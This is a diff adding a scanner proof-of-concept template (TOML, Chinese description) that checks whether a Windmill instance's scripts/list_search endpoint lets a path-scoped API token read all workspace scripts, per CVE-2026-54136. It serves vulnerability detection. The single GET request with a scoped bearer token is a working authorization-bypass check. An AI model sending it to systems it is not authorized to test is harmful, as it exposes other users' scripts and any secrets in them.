@@ -1,0 +1,42 @@
+[info]
+author = "AVE"
+description = "检测 Windmill scripts/list_search 端点是否在资源作用域API令牌限制下返回越权脚本内容。攻击者持有路径受限的 scripts:read:{resource} 令牌时，通过 GET /api/w/{workspace}/scripts/list_search 可获取工作区中所有脚本的 path 和 content，绕过 resource/path 校验。"
+id = "POC-AVE-2026-0486"
+name = "CVE-2026-54136 Windmill 资源作用域API令牌路径限制绕过 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-54136",
+    "windmill",
+    "authorization-bypass",
+    "api-token",
+]
+vuln_id = [
+    "CVE-2026-54136",
+    "GHSA-2ppx-66jv-wpw5",
+    "AVE-2026-0486",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/api/w/{{workspace}}/scripts/list_search"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Authorization = "Bearer {{scoped_token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    '"path"',
+    '"content"',
+]
